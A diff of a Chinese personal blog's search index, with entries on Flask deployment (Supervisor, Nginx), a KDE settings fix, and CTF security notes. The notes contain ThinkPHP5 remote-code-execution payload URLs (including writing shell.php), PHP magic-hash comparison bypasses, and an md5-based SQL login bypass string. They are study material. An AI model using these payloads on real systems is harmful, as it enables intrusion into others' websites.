+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">deactivate</span></span><br></pre></td></tr></table></figure>
+<h1>Supervisor配置</h1>
+<p><strong>使用root用户：</strong></p>
+<p>配置supervisor：</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">apt install supervisor</span><br><span class="line"><span class="keyword">cd</span> /etc/supervisor/<span class="keyword">conf</span>.d</span><br><span class="line"><span class="keyword">vim</span> blog.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>
+<p>vim写入：</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进程的名字，取一个以后自己一眼知道是什么的名字。</span></span><br><span class="line"><span class="section">[program:blog]</span></span><br><span class="line"><span class="comment"># 定义命令。你只要注意后面的目录对就行。特别注意「run:app」的run，这个名字是你网站应用的文件名。如果是run.py，就写run。</span></span><br><span class="line"><span class="attr">command</span>=/home/www/blog/venv/bin/gunicorn run:app -c /home/www/blog/gunicorn.conf</span><br><span class="line"><span class="comment"># 网站目录</span></span><br><span class="line"><span class="attr">directory</span>=/home/www/blog</span><br><span class="line"><span class="comment"># 进程所属用户。</span></span><br><span class="line"><span class="attr">user</span>=www</span><br><span class="line"><span class="comment"># 自动重启设置。</span></span><br><span class="line"><span class="attr">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">autorestart</span>=<span class="literal">true</span></span><br><span class="line"><span class="comment"># 日志存放位置。</span></span><br><span class="line"><span class="attr">stdout_logfile</span>=/home/www/blog/logs/gunicorn_supervisor.log</span><br><span class="line"><span class="comment"># 设置环境变量。这里这行的意思是：设置环境变量MODE的值为UAT。请根据自己的需要配置，如没有需要这行可以删除。</span></span><br><span class="line"><span class="attr">environment</span> = MODE=<span class="string">"UAT"</span></span><br></pre></td></tr></table></figure>
+<p><code>:wq</code>保存。</p>
+<p><strong>回到supervisor的目录：</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/etc/supervisor</span></span><br></pre></td></tr></table></figure>
+<p>启动supervisor：</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">service supervisor <span class="literal">start</span></span><br></pre></td></tr></table></figure>
+<p>加载配置：</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">sudo</span> <span class="string">supervisorctl reread</span></span><br><span class="line"><span class="attr">supervisorctl</span> <span class="string">update</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">supervisorctl start blog</span></span><br></pre></td></tr></table></figure>
+<h1>Nginx配置</h1>
+<p>开始配置nginx：</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">apt</span> <span class="string">install nginx</span></span><br><span class="line"><span class="attr">cd</span> <span class="string">/etc/nginx/sites-avaliable</span></span><br><span class="line"><span class="attr">vim</span> <span class="string">blog</span></span><br></pre></td></tr></table></figure>
+<p>输入对于blog的配置：</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">server</span> <span class="string">&#123;  </span></span><br><span class="line">        <span class="attr">listen</span>   <span class="string">80;  </span></span><br><span class="line">        <span class="attr">server_name</span> <span class="string">www.xxx.com xxx.com;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">root</span> <span class="string">/home/www/blog;</span></span><br><span class="line">        <span class="attr">access_log</span> <span class="string">/home/www/blog/logs/access.log;</span></span><br><span class="line">        <span class="attr">error_log</span> <span class="string">/home/www/blog/logs/access.log;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">location</span> <span class="string">/ &#123;  </span></span><br><span class="line">            <span class="attr">proxy_set_header</span> <span class="string">X-Forward-For $proxy_add_x_forwarded_for;  </span></span><br><span class="line">            <span class="attr">proxy_set_header</span> <span class="string">Host $http_host;  </span></span><br><span class="line">            <span class="attr">proxy_redirect</span> <span class="string">off;  </span></span><br><span class="line">            <span class="attr">if</span> <span class="string">(!-f $request_filename) &#123;  </span></span><br><span class="line">                <span class="attr">proxy_pass</span> <span class="string">http://127.0.0.1:8000;  </span></span><br><span class="line">                <span class="meta">break;</span>  <span class="string"></span></span><br><span class="line">            <span class="meta">&#125;</span>  <span class="string"></span></span><br><span class="line">        <span class="meta">&#125;</span>  <span class="string"></span></span><br><span class="line">    <span class="attr">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>**检查并根据实际情况修改上面的server_name和root配置。**检查监听端口和上面设置是否一致。<code>:wq</code>保存。</p>
+<p>下面链接配置文件到sites-enabled:</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-enabled/</span></span><br><span class="line">ln -s <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-avaliable/</span>blog .<span class="regexp">/blog</span></span><br></pre></td></tr></table></figure>
+<p>重启nginx：</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service nginx restart</span></span><br></pre></td></tr></table></figure>
+<p>阿里云安全组配置允许入方向80端口。完成。</p>
+<p>键入域名或ip即可访问。</p>
+]]></content>
+      <categories>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入笔记</title>
     <url>/2020/06/01/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p>Sql 注入是渗透测试中的一个重要部分。这里是一些 Sql 注入相关内容的总结和整理，留待以后查阅。</p>
@@ -224,131 +722,9 @@
         <category>网络安全</category>
       </categories>
       <tags>
+        <tag>CTF</tag>
         <tag>渗透测试</tag>
-        <tag>CTF</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>CTF中琐碎的姿势们</title>
-    <url>/2020/06/16/CTF%E4%B8%AD%E7%90%90%E7%A2%8E%E7%9A%84%E5%A7%BF%E5%8A%BF%E4%BB%AC/</url>
-    <content><![CDATA[<p>记录CTF中的一些琐碎杂项备忘，方便查找。</p>
-<a id="more"></a>
-<h2 id="HTML">HTML</h2>
-<h3 id="HTML中的特殊转义字符">HTML中的特殊转义字符</h3>
-<table>
-<thead>
-<tr>
-<th>字符</th>
-<th>十进制</th>
-<th>转义字符</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>&quot;</td>
-<td><code>&amp;#34;</code></td>
-<td><code>&amp;quot;</code></td>
-</tr>
-<tr>
-<td>&amp;</td>
-<td><code>&amp;#38;</code></td>
-<td><code>&amp;amp;</code></td>
-</tr>
-<tr>
-<td>&lt;</td>
-<td><code>&amp;#60;</code></td>
-<td><code>&amp;lt;</code></td>
-</tr>
-<tr>
-<td>&gt;</td>
-<td><code>&amp;#62;</code></td>
-<td><code>&amp;gt;</code></td>
-</tr>
-<tr>
-<td>不断开空格(non-breaking space)</td>
-<td><code>&amp;#160;</code></td>
-<td><code>&amp;nbsp;</code></td>
-</tr>
-<tr>
-<td>|</td>
-<td><code>&amp;#166;</code></td>
-<td><code>&amp;brvbar;</code></td>
-</tr>
-</tbody>
-</table>
-<h2 id="Linux">Linux</h2>
-<h3 id="vim">vim</h3>
-<h3 id="swp-swo-…-文件">.swp/.swo/… 文件</h3>
-<p>这些文件是vim创建的临时文件。一个文件在vim中打开之后会创建 .swp 文件。如果 .swp 文件已存在，则创建 .swo 文件，若 .swo 文件存在则创建 .swn 文件，以此类推。vim 关闭时这些文件将自动被删除，若vim崩溃或被杀死，则保留。有时可用作 CTF 中源码的来源。</p>
-<p>例如：一个叫 <code>abc.php</code> 的文件会产生一个名为 <code>.abc.php.swp</code> 的临时文件。注意文件最前面有一个小点。</p>
-<h2 id="PHP">PHP</h2>
-<h3 id="PHP基础">PHP基础</h3>
-<h4 id="的区别">-&gt; , =&gt; , :: 的区别</h4>
-<p><code>-&gt;</code> 是插入式解引用的符号，用法与C语言相似。<code>=&gt;</code> 在数组中常常出现，用来连接键值对。<code>::</code> 与C语言中的 <code>.</code> 类似，用于调用类的内部成员，或类之间的相互调用。</p>
-<h3 id="phps">.phps</h3>
-<p>服务器遇php文件会解析。此时若想要读源码要使用phps文件。源码泄露的来源。</p>
-<h3 id="thinkphp5-RCE">thinkphp5 RCE</h3>
-<p>5.1.x php版本&gt;5.5</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&amp;filter=assert</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=assert&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=phpinfo()</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=<span class="xml"><span class="php"><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure>
-<p>5.0.x php版本&gt;=5.4</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=index/\think\Container/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br></pre></td></tr></table></figure>
-<p>还可参见<a href="https://y4er.com/post/thinkphp5-rce/#5020" target="_blank" rel="noopener"><strong>Thinkphp</strong>5 RCE总结 – Y4er的博客</a>。</p>
-<h2 id="配置错误">配置错误</h2>
-<h3 id="源码泄露">源码泄露</h3>
-<h4 id="常见的网站源码备份文件后缀">常见的网站源码备份文件后缀</h4>
-<ul>
-<li>tar</li>
-<li>tar.gz</li>
-<li>zip</li>
-<li>rar</li>
-</ul>
-<h4 id="常见的网站源码备份文件名">常见的网站源码备份文件名</h4>
-<ul>
-<li>web</li>
-<li>website</li>
-<li>backup</li>
-<li>back</li>
-<li>www</li>
-<li>wwwroot</li>
-<li>temp</li>
-</ul>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF中的命令执行</title>
-    <url>/2020/06/16/CTF%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Linux相关笔记</title>
-    <url>/2020/06/16/Linux%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>PHP反序列化笔记</title>
-    <url>/2020/06/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Mysql基础补完</title>
-    <url>/2020/06/17/Mysql%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%AE%8C/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>前端三剑客笔记</title>
-    <url>/2020/06/16/%E5%89%8D%E7%AB%AF%E4%B8%89%E5%89%91%E5%AE%A2%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Python利用多线程和多进程编写脚本</title>
-    <url>/2020/06/16/Python%E5%88%A9%E7%94%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>正则学习笔记</title>
@@ -591,296 +967,123 @@
       </tags>
   </entry>
   <entry>
-    <title>Tkinter学习笔记</title>
-    <url>/2020/06/16/Tkinter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>简单的Python GUI… 要想强大一点还是去用PyQt了。</p>
+    <title>解决更改Plasma桌面后KDE系统设置无法打开的问题</title>
+    <url>/2020/09/11/%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%94%B9Plasma%E6%A1%8C%E9%9D%A2%E5%90%8EKDE%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>更新 Manjaro Linux(KDE) 的 Plasma 主题包之后发现系统设置无法打开的解决方案。</p>
 <a id="more"></a>
-<h1>使用逻辑</h1>
-<ol>
-<li>
-<p>import tkinter。</p>
-</li>
-<li>
-<p>实例化窗口对象。例如</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">window</span> = tkinter.Tk()</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>对刚才实例化的窗口对象进行设置，如</p>
-<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">window</span>.<span class="meta">title</span>(<span class="string">'This is a titie.'</span>)</span><br><span class="line"><span class="meta">window</span>.geometry(<span class="string">'200x100'</span>)   # 中间的符号是英文字母<span class="string">'x'</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>实例化各窗口内的控件并将其放置在窗口的某个位置，例如</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 实例化标签对象, 注意：方法的首字母大写</span></span><br><span class="line">label = tkinter.Label(window, <span class="attribute">text</span>=<span class="string">''</span>, <span class="attribute">textvariable</span>=..., font=(<span class="string">'Consolas'</span>, 20, <span class="string">'bold'</span>), <span class="attribute">width</span>=150, <span class="attribute">height</span>=100)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 放置在窗口的某个位置</span></span><br><span class="line">label.pack()</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>令主窗口自我刷新，完成GUI的交互作用，如</p>
-<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.mainloop()</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h1>简单控件的使用方法小结</h1>
-<ul>
-<li>
-<p>Label控件</p>
-<p>Label控件是tkinter中的标签控件。用于显示文本和图像。语法格式如下：</p>
-<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">label = tkinter.<span class="constructor">Label( <span class="params">master</span>, <span class="params">options</span>, <span class="operator">...</span>)</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>
-<p>master: 框架的父容器，可理解为某个窗口。</p>
-</li>
-<li>
-<p>options: 可设置的属性。这些选项可以用键值对的形式设置，并以逗号分隔。</p>
-<p>以下是可选项清单：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">序号</th>
-<th style="text-align:center">可选项 &amp; 描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">1</td>
-<td style="text-align:center">**anchor **    文本或图像在背景内容区的位置，默认为 center，可选值为（n,s,w,e,ne,nw,sw,se,center）eswn 是东南西北英文的首字母，表示：上北下南左西右东。</td>
-</tr>
-<tr>
-<td style="text-align:center">2</td>
-<td style="text-align:center"><strong>bg</strong>  标签背景颜色</td>
-</tr>
-<tr>
-<td style="text-align:center">4</td>
-<td style="text-align:center"><strong>bd</strong>  标签的大小，默认为 2 个像素</td>
-</tr>
-<tr>
-<td style="text-align:center">4</td>
-<td style="text-align:center"><strong>bitmap</strong>  指定标签上的位图，如果指定了图片，则该选项忽略</td>
-</tr>
-<tr>
-<td style="text-align:center">5</td>
-<td style="text-align:center">**cursor ** 鼠标移动到标签时，光标的形状，可以设置为 arrow, circle, cross, plus 等。</td>
-</tr>
-<tr>
-<td style="text-align:center">6</td>
-<td style="text-align:center">**font ** 设置字体。</td>
-</tr>
-<tr>
-<td style="text-align:center">7</td>
-<td style="text-align:center">**fg ** 设置前景色。</td>
-</tr>
-<tr>
-<td style="text-align:center">8</td>
-<td style="text-align:center">**height ** 标签的高度，默认值是 0。</td>
-</tr>
-<tr>
-<td style="text-align:center">9</td>
-<td style="text-align:center">**image ** 设置标签图像。</td>
-</tr>
-<tr>
-<td style="text-align:center">10</td>
-<td style="text-align:center"><strong>justify</strong> 定义对齐方式，可选值有：LEFT,RIGHT,CENTER，默认为 CENTER。</td>
-</tr>
-<tr>
-<td style="text-align:center">11</td>
-<td style="text-align:center"><strong>padx</strong>  x轴间距，以像素计，默认 1。</td>
-</tr>
-<tr>
-<td style="text-align:center">12</td>
-<td style="text-align:center"><strong>pady</strong>  y轴间距，以像素计，默认 1。</td>
-</tr>
-<tr>
-<td style="text-align:center">13</td>
-<td style="text-align:center"><strong>relief</strong>  边框样式，可选的有：FLAT、SUNKEN、RAISED、GROOVE、RIDGE。默认为 FLAT。</td>
-</tr>
-<tr>
-<td style="text-align:center"><strong>14</strong></td>
-<td style="text-align:center">**text ** 设置文本，可以包含换行符(\n)。</td>
-</tr>
-<tr>
-<td style="text-align:center"><strong>15</strong></td>
-<td style="text-align:center"><strong>textvariable</strong>  标签显示 Tkinter 变量，StringVar。如果变量被修改，标签文本将自动更新。</td>
-</tr>
-<tr>
-<td style="text-align:center">16</td>
-<td style="text-align:center">**underline ** 设置下划线，默认 -1，如果设置 1，则是从第二个字符开始画下划线。</td>
-</tr>
-<tr>
-<td style="text-align:center">17</td>
-<td style="text-align:center">**width ** 设置标签宽度，默认值是 0，自动计算，单位以像素计。</td>
-</tr>
-<tr>
-<td style="text-align:center">10</td>
-<td style="text-align:center">**wraplength ** 设置标签文本为多少行显示，默认为 0。</td>
-</tr>
-</tbody>
-</table>
-</li>
-</ul>
-</li>
-<li>
-<p>Button控件</p>
-<p>Button控件是tkinter中的按钮控件。用于在程序中显示按钮。按钮可与一个command函数进行关联，在按下按钮时执行command函数。语法格式如下：</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">button = tkinter.Button ( master, <span class="attribute">option</span>=value, <span class="built_in">..</span>. )</span><br></pre></td></tr></table></figure>
-<p>以下是可选项清单：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">序号</th>
-<th style="text-align:center">可选项 &amp; 描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">1</td>
-<td style="text-align:center"><strong>activebackground</strong>  当鼠标放上去时，按钮的背景色</td>
-</tr>
-<tr>
-<td style="text-align:center">2</td>
-<td style="text-align:center">**activeforeground ** 当鼠标放上去时，按钮的前景色</td>
-</tr>
-<tr>
-<td style="text-align:center">3</td>
-<td style="text-align:center">**bd ** 按钮边框的大小，默认为 2 个像素</td>
-</tr>
-<tr>
-<td style="text-align:center">4</td>
-<td style="text-align:center">**bg ** 按钮的背景色</td>
-</tr>
-<tr>
-<td style="text-align:center"><strong>5</strong></td>
-<td style="text-align:center"><strong>command</strong>  按钮关联的函数，当按钮被点击时，执行该函数</td>
-</tr>
-<tr>
-<td style="text-align:center">6</td>
-<td style="text-align:center">**fg ** 按钮的前景色（按钮文本的颜色）</td>
-</tr>
-<tr>
-<td style="text-align:center">7</td>
-<td style="text-align:center">**font ** 文本字体</td>
-</tr>
-<tr>
-<td style="text-align:center">8</td>
-<td style="text-align:center">**height ** 按钮的高度</td>
-</tr>
-<tr>
-<td style="text-align:center">9</td>
-<td style="text-align:center">**highlightcolor ** 要高亮的颜色</td>
-</tr>
-<tr>
-<td style="text-align:center">10</td>
-<td style="text-align:center"><strong>image</strong>  按钮上要显示的图片</td>
-</tr>
-<tr>
-<td style="text-align:center">11</td>
-<td style="text-align:center">**justify ** 显示多行文本的时候,设置不同行之间的对齐方式，可选项包括LEFT, RIGHT, CENTER</td>
-</tr>
-<tr>
-<td style="text-align:center">12</td>
-<td style="text-align:center">**padx **  按钮在x轴方向上的内边距(padding)，是指按钮的内容与按钮边缘的距离</td>
-</tr>
-<tr>
-<td style="text-align:center">13</td>
-<td style="text-align:center">**pady ** 按钮在y轴方向上的内边距(padding)</td>
-</tr>
-<tr>
-<td style="text-align:center">14</td>
-<td style="text-align:center">**relief ** 边框样式，设置控件3D效果，可选的有：FLAT、SUNKEN、RAISED、GROOVE、RIDGE。默认为 FLAT。</td>
-</tr>
-<tr>
-<td style="text-align:center">15</td>
-<td style="text-align:center">**state ** 设置按钮组件状态,可选的有NORMAL、ACTIVE、 DISABLED。默认 NORMAL。</td>
-</tr>
-<tr>
-<td style="text-align:center">16</td>
-<td style="text-align:center">**underline ** 下划线。默认按钮上的文本都不带下划线。取值就是带下划线的字符串索引，为 0 时，第一个字符带下划线，为 1 时，前两个字符带下划线，以此类推</td>
-</tr>
-<tr>
-<td style="text-align:center">17</td>
-<td style="text-align:center">**width ** 按钮的宽度，如未设置此项，其大小以适应按钮的内容（文本或图片的大小）</td>
-</tr>
-<tr>
-<td style="text-align:center">18</td>
-<td style="text-align:center">**wraplength ** 限制按钮每行显示的字符的数量</td>
-</tr>
-<tr>
-<td style="text-align:center">19</td>
-<td style="text-align:center">**text ** 按钮的文本内容</td>
-</tr>
-<tr>
-<td style="text-align:center">19</td>
-<td style="text-align:center"><strong>anchor</strong>  锚选项，控制文本的位置，默认为中心</td>
-</tr>
-</tbody>
-</table>
-</li>
-</ul>
+<h1>问题描述</h1>
+<p>在 Manjaro Linux 下配置 KDE Plasma 的时候更换了McMojave 主题。更换之后发现系统设置无法打开。猜测是由于主题的冲突导致的，于是猜测用切换成默认主题的方式可以解决此问题。但是一般更换默认主题的方式都是从系统设置入手，找到外观选项再切换主题，现在系统设置的 GUI 界面无法打开，于是尝试用其它方法更换成默认主题。</p>
+<h1>失败的尝试</h1>
+<h2 id="用中文搜索相关内容">用中文搜索相关内容</h2>
+<p>什么也没有。中文使用地区对操作系统问题的相关支持还是太薄弱了，即使有相关内容也一般都是及其过时的只言片语，相反转而去搜索英文内容的时候发现相关支持非常多，还是差距挺大的。也算获得了经验，以后遇到问题宁可去啃英文的文档也要减少对中文的依赖。</p>
+<h2 id="删除KDE设置项并重启">删除KDE设置项并重启</h2>
+<p>根据网络上的相关支持，将 <code>~/</code> 目录下的 <code>~/.kde/</code> 和 <code>~/.kde4/</code> 目录删除并重启，重启后发现 <code>~/.kde/</code> 目录自动生成了，其中的配置文件是根据当前主题的设置自动生成的。遂放弃。</p>
+<h2 id="重新安装-plasma-desktop-和-plasma-meta">重新安装 plasma-desktop 和 plasma-meta</h2>
+<p>重新安装之后发现没有任何变化。</p>
+<h1>成功的尝试</h1>
+<h2 id="用命令行检查系统设置GUI程序的问题">用命令行检查系统设置GUI程序的问题</h2>
+<p>Konsole 中键入 <code>systemsettings5</code> 以尝试从命令行启动系统设置。发现输出错误：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cyclic dependency detected between <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> and <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span></span><br><span class="line">file:///usr/share/kpackage/genericqml/org.kde.systemsettings.sidebar/contents/ui/subcategorypage.qml:141:9: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/share/kpackage/genericqml/org.kde.systemsettings.sidebar/contents/ui/subcategorypage.qml:131:9: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/lib/qt/qml/org/kde/kirigami.2/private/refreshablescrollview.qml:143:13: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/lib/qt/qml/org/kde/kirigami.2/private/refreshablescrollview.qml:143:13: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125; </span><br><span class="line">cyclic dependency detected between</span><br><span class="line"><span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> and</span><br><span class="line"><span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span></span><br><span class="line">qqmlengine::setcontextforobject(): object already has a qqmlcontext qt.qpa.xcb:</span><br><span class="line">qxcbconnection: xcb error: 5 (badatom), sequence: 629, resource id: 0, major code: 20 (getproperty), minor code: 0</span><br></pre></td></tr></table></figure>
+<p>似乎确定了问题是由于新采用的主题产生了循环依赖之类的问题。接下来考虑如何将主题更换回默认。</p>
+<h2 id="从命令行将主题更换回-Breeze（默认主题）">从命令行将主题更换回 Breeze（默认主题）</h2>
+<p>使用 Konsole，键入 <code>systemsettings5 --style=Breeze</code>，绕过GUI界面从命令行直接更改主题。重启。系统设置可以打开，问题得到解决。</p>
+<p>详请参见：<a href="https://www.reddit.com/r/kde/comments/i0m5gz/system_settings_wont_open_after_changing/" target="_blank" rel="noopener">https://www.reddit.com/r/kde/comments/i0m5gz/system_settings_wont_open_after_changing/</a></p>
+<h1>感想</h1>
+<p>中文社区的力量还是比较渺小，学英语真的很重要，英文社区啥都有（</p>
 ]]></content>
       <categories>
-        <category>开发</category>
+        <category>系统</category>
       </categories>
       <tags>
-        <tag>开发</tag>
-        <tag>python</tag>
-        <tag>GUI</tag>
+        <tag>KDE</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
-    <title>PHP相关姿势</title>
-    <url>/2020/06/16/PHP%E7%9B%B8%E5%85%B3%E5%A7%BF%E5%8A%BF/</url>
-    <content><![CDATA[<p>整理 CTF 中 PHP 相关的利用姿势，不定期补充。</p>
+    <title>文件上传操作整理</title>
+    <url>/2020/07/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%93%8D%E4%BD%9C%E6%95%B4%E7%90%86/</url>
+    <content><![CDATA[<p>获取Webshell的常见操作，整理一下。</p>
 <a id="more"></a>
-<h2 id="弱类型相关姿势">弱类型相关姿势</h2>
-<p>弱类型的语言对变量的数据类型没有限制，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据。</p>
-<h3 id="比较操作符">比较操作符</h3>
-<h4 id="类型转换">类型转换</h4>
-<p>弱等的比较中不需左右两边的类型相等，会经过转换变成相同的类型后比较，由此产生安全问题。如：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">NULL</span>;$b=<span class="keyword">FALSE</span>;  <span class="comment">//$a==$b</span></span><br><span class="line">$a=<span class="string">''</span>;$b=<span class="keyword">NULL</span>;  <span class="comment">//$a==$b</span></span><br></pre></td></tr></table></figure>
-<p>还有，bool类型的true跟任意字符串可以弱类型相等。</p>
-<p>以及类型转换的一些规则，如字符串转数字会从不满足转换规则的位置开始截断只取最前边的数字部分而不会报错等。（ 注：数字到字符串可以用strval()，字符串和数字可以用intval() ）</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> == <span class="string">'0'</span>		<span class="comment">//true</span></span><br><span class="line"><span class="number">0</span> == <span class="string">'abcdefg'</span>	<span class="comment">//true</span></span><br><span class="line"><span class="number">0</span> === <span class="string">'abcdefg'</span>	<span class="comment">//false</span></span><br><span class="line"><span class="number">1</span> == <span class="string">'1abcdef'</span>	<span class="comment">//true</span></span><br><span class="line"><span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>   <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
-<h4 id="哈希比较">哈希比较</h4>
-<h5 id="md5-弱等的绕过">md5 弱等的绕过</h5>
-<p>md5(‘240610708’) == md5(‘QNKCDZO’) (0exxxxxxx)</p>
-<p>在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中2个数的值都是0因而就相等了。如果不满足0e\d+这种模式就不会相等。</p>
-<p>0e\d+ 的字符串整理：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br></pre></td></tr></table></figure>
-<p>强等的绕过方法放在后文的 内置函数的参数松散性 一节中。</p>
-<h5 id="绕过-md5-函数注入-MySQL">绕过 md5()函数注入 MySQL</h5>
-<p><code>ffifdyop</code> 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6（<code>'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>），而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 <code>select * from 'admin' where password='' or '6xxxxx'</code></p>
-<p>等价于 or 一个永真式，因此相当于万能密码，可以绕过 md5()函数。</p>
-<p>或者 129581926211651571912466741651878684928，<br>
-md5 值为 <code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8</code> 也可行。</p>
